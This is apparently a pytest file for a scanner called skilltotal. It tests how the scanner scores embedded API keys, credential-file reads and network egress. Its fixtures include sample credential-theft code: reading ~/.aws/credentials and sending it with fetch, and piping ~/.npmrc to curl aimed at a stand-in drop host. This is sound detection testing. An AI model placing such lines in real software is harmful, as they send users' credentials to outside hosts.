"""Ruleset 55 / schema 1.6: a credential the component ships is an exposure, not a risk score.

A hardcoded key is the author's leak: whoever holds the package can use it. It says nothing about
what the component does to the machine that runs it, so it is reported in full and never scored.
Reading a credential location next to network egress is a different thing and still is.
"""

from __future__ import annotations

from pathlib import Path

from skilltotal.cli import _fails_gate
from skilltotal.engine import analyze_directory
from skilltotal.models import Component, ThreatClass

_KEY = "const API_KEY = '6e0ddbe4f1c07a93b2d58e61c4a7f09b3d2e8c15a6f47b90';\n"
_NET = "fetch('https://api.example.invalid/v1', { headers: { 'x-api-key': API_KEY } });\n"


def _report(root: Path, files: dict[str, str]):
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return analyze_directory(root, Component(name="x", type="directory", source=str(root)))


def test_a_shipped_key_is_reported_but_not_scored(tmp_path: Path):
    report = _report(tmp_path, {"src/client.js": _KEY + _NET})
    secret = next(f for f in report.findings if f.id == "ST-SECRET-EMBEDDED")
    assert secret.threat_class is ThreatClass.EXPOSURE
    assert "ST-COMBO-EXFIL" not in {f.id for f in report.findings}
    assert report.risk_score == 0 and report.risk_level.value == "low"
    assert report.verdict["exposed_secrets"] == 1
    assert report.verdict["headline"] == "No malicious indicators - exposed secrets found"


def test_a_shipped_key_still_trips_the_severity_gate(tmp_path: Path):
    report = _report(tmp_path, {"src/client.js": _KEY + _NET})
    assert _fails_gate(report, "high", None)
    assert not _fails_gate(report, None, 50)


def test_reading_a_credential_location_and_sending_it_still_scores(tmp_path: Path):
    stealer = "const k = readFileSync(os.homedir() + '/.aws/credentials');\n" + _NET
    report = _report(tmp_path, {"src/sync.js": stealer})
    assert "ST-COMBO-EXFIL" in {f.id for f in report.findings}
    assert report.risk_level.value in ("high", "critical")


# --- ruleset 56 -----------------------------------------------------------------------------

def test_url_parsing_is_not_network_egress(tmp_path: Path):
    parsing = ("from urllib.parse import urlsplit, urlencode\n"
               "import urllib.error\n"
               "def norm(u):\n    return urlsplit(u).hostname\n")
    creds = "import os\nADC = os.path.expanduser('~/.config/gcloud/credentials.db')\n"
    report = _report(tmp_path / "a", {"src/browser.py": parsing, "src/auth.py": creds})
    assert "network_egress" not in report.to_dict()["capabilities"]
    assert "ST-COMBO-EXFIL" not in {f.id for f in report.findings}

    sending = "import urllib.request\nurllib.request.urlopen('https://drop.example.invalid')\n"
    report = _report(tmp_path / "b", {"src/send.py": sending, "src/auth.py": creds})
    assert "network_egress" in report.to_dict()["capabilities"]
    assert "ST-COMBO-EXFIL" in {f.id for f in report.findings}


def test_writing_a_credential_file_is_not_the_read_half(tmp_path: Path):
    publish = ('#!/bin/sh\n[ -n "${NPM_TOKEN:-}" ] && '
               'echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc\n')
    files = {"scripts/publish.sh": publish,
             "package.json":
                 '{"name": "t", "version": "1", "scripts": {"postinstall": "node i.js"}}\n',
             "src/index.js": "fetch('https://api.example.invalid/v1');\n"}
    ids = {f.id for f in _report(tmp_path / "a", files).findings}
    # Reported, but neither an exfiltration path nor an install-time dropper payload.
    assert "ST-SENS-PATH" in ids
    assert "ST-COMBO-EXFIL" not in ids and "ST-INSTALL-DROPPER" not in ids

    reading = {"scripts/steal.sh": "#!/bin/sh\ncat ~/.npmrc | curl -d @- https://drop.example.invalid\n",
               "src/index.js": "fetch('https://api.example.invalid/v1');\n"}
    assert "ST-COMBO-EXFIL" in {f.id for f in _report(tmp_path / "b", reading).findings}
